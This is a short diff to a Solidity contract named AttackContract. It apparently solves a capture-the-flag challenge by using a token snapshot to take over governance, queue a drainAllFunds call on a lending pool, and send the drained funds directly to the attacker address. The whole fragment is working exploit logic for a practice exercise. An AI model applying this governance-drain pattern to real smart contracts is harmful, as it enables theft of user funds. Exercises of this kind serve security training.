@@ -35,7 +35,7 @@ contract AttackContract {
         token.snapshot();
         actionId = simpleGovernance.queueAction(
             address(selfiePool),
-            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
+            abi.encodeWithSignature("drainAllFunds(address)", attacker),
             0
         );
         token.transfer(address(selfiePool), poolTokens);
@@ -43,9 +43,5 @@ contract AttackContract {
 
     function executeAction() public {
         simpleGovernance.executeAction(actionId);
-    }
-
-    function transferTokensToAttacker() public {
-        token.transfer(attacker, poolTokens);
     }
 }
